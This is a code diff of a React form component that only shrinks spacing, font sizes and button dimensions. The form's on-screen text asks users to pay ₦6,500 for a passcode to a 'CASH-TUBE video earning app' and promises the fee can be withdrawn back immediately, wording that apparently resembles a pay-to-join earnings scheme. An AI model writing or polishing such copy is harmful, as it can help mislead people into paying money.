@@ -66,55 +66,55 @@ export default function PasscodeDetailsForm({ isOpen, onClose, onDetailsComplete
   if (!isOpen) return null
 
   return (
-    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-3 z-[60]">
-      <div className="relative w-full max-w-sm">
+    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-2 z-[60]">
+      <div className="relative w-full max-w-xs">
         {/* Background */}
-        <div className="bg-white rounded-2xl p-5 relative overflow-hidden shadow-lg max-h-[90vh] overflow-y-auto">
+        <div className="bg-white rounded-xl p-4 relative overflow-hidden shadow-md max-h-[95vh] overflow-y-auto">
           {/* Close Button */}
           <Button
             onClick={onClose}
             variant="ghost"
             size="icon"
-            className="absolute top-3 right-3 text-gray-500 hover:text-gray-700 z-10 h-8 w-8"
+            className="absolute top-2 right-2 text-gray-500 hover:text-gray-700 z-10 h-6 w-6"
           >
-            <X className="h-5 w-5" />
+            <X className="h-4 w-4" />
           </Button>
 
           {/* Header */}
-          <div className="mb-6">
-            <h1 className="text-2xl font-bold text-gray-800 mb-3">Buy Your passcode</h1>
-            <p className="text-sm text-gray-600 font-medium leading-relaxed">
+          <div className="mb-4">
+            <h1 className="text-lg font-semibold text-gray-800 mb-2">Buy Your passcode</h1>
+            <p className="text-xs text-gray-600 font-medium leading-relaxed">
               Please provide your details, note that your passcode will be reviewed immediately your payment is
               completed
             </p>
           </div>
 
           {/* Form */}
-          <form onSubmit={handleSubmit} className="space-y-5">
+          <form onSubmit={handleSubmit} className="space-y-3">
             {/* Name Field */}
             <div>
-              <label className="block text-gray-800 text-base font-semibold mb-2">Name:</label>
+              <label className="block text-gray-800 text-sm font-medium mb-1">Name:</label>
               <Input
                 type="text"
                 name="name"
                 value={formData.name}
                 onChange={handleInputChange}
                 placeholder="Enter your full name"
-                className="w-full h-12 text-base font-medium border-2 border-gray-300 rounded-lg px-4 bg-gray-50"
+                className="w-full h-9 text-sm font-medium border border-gray-300 rounded-md px-3 bg-gray-50"
                 required
               />
             </div>
 
             {/* Number Field */}
             <div>
-              <label className="block text-gray-800 text-base font-semibold mb-2">Number:</label>
+              <label className="block text-gray-800 text-sm font-medium mb-1">Number:</label>
               <Input
                 type="tel"
                 name="number"
                 value={formData.number}
                 onChange={handleInputChange}
                 placeholder="Enter your phone number"
-                className="w-full h-12 text-base font-medium border-2 border-gray-300 rounded-lg px-4 bg-gray-50"
+                className="w-full h-9 text-sm font-medium border border-gray-300 rounded-md px-3 bg-gray-50"
                 maxLength={11}
                 required
               />
@@ -122,12 +122,12 @@ export default function PasscodeDetailsForm({ isOpen, onClose, onDetailsComplete
 
             {/* Amount Field */}
             <div>
-              <label className="block text-gray-800 text-base font-semibold mb-2">Amount:</label>
+              <label className="block text-gray-800 text-sm font-medium mb-1">Amount:</label>
               <Input
                 type="text"
                 value={`₦${formData.amount.toLocaleString()}`}
                 readOnly
-                className="w-full h-12 text-lg font-semibold bg-gray-100 border-2 border-gray-300 rounded-lg px-4 text-center"
+                className="w-full h-9 text-sm font-medium bg-gray-100 border border-gray-300 rounded-md px-3 text-center"
               />
             </div>
 
@@ -135,11 +135,11 @@ export default function PasscodeDetailsForm({ isOpen, onClose, onDetailsComplete
             <Button
               type="submit"
               disabled={isProcessing}
-              className="w-full h-12 bg-purple-600 hover:bg-purple-700 text-white text-base font-semibold rounded-lg shadow-md"
+              className="w-full h-9 bg-purple-600 hover:bg-purple-700 text-white text-sm font-medium rounded-md shadow-sm"
             >
               {isProcessing ? (
                 <>
-                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
+                  <Loader2 className="h-3 w-3 mr-1 animate-spin" />
                   Processing...
                 </>
               ) : (
@@ -149,12 +149,12 @@ export default function PasscodeDetailsForm({ isOpen, onClose, onDetailsComplete
           </form>
 
           {/* Footer Information */}
-          <div className="mt-6 space-y-3 text-gray-700">
-            <p className="text-sm font-medium leading-relaxed">
+          <div className="mt-4 space-y-2 text-gray-700">
+            <p className="text-xs font-medium leading-relaxed">
               You have to make payment of <span className="text-purple-600 font-semibold">₦6,500</span> in order to be
               granted full access to the <span className="text-pink-400 font-medium">CASH-TUBE</span> video earning app.
             </p>
-            <p className="text-sm font-medium leading-relaxed">
+            <p className="text-xs font-medium leading-relaxed">
               Please note that you can withdraw back your <span className="text-purple-600 font-semibold">₦6,500</span>
               immediately you gain access to your dashboard.
             </p>
